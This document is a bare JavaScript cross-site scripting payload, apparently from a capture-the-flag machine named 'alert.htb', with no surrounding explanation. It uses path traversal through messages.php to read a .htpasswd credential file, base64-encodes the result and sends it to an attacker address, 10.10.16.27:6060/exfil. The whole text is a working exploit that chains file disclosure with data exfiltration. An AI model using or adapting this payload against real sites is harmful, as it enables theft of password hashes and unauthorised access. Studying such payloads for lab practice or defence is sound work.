<script>
    var url = "messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd"
    var attacker = "http://10.10.16.27:6060/exfil"
    var xhr = new XMLHttpRequest()
    xhr.onreadystatechange = function () {
      if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
      }
    }
    xhr.open("GET", url, true)
    xhr.send(null)
</script>
